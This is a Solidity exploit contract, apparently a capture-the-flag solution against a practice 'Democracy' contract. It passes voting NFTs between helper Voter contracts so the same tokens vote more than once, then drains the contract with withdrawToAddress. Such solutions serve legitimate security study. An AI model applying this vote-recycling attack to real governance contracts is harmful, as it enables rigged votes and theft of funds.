pragma solidity 0.8.15;

import "../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
import "./Democracy.sol";

contract Attacker {
    Democracy democracy;

    constructor(address _democracy) {
        democracy = Democracy(_democracy);
        democracy.nominateChallenger(address(this));

        Voter voter1 = new Voter();
        Voter voter2 = new Voter();
        Voter voter3 = new Voter();
        democracy.safeTransferFrom(address(this), address(voter1), 0, "");
        democracy.safeTransferFrom(address(this), address(voter2), 1, "");
        voter1.vote(address(democracy), address(this), 0);
        democracy.safeTransferFrom(address(this), address(voter2), 0, "");
        voter2.vote(address(democracy), address(this), 1);

        democracy.withdrawToAddress(address(this));
    }
}

contract Voter is IERC721Receiver {
    function vote(
        address _democracy,
        address _nominee,
        uint256 _tokenId
    ) public {
        Democracy(_democracy).vote(_nominee);
        Democracy(_democracy).safeTransferFrom(
            address(this),
            msg.sender,
            _tokenId,
            ""
        );
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
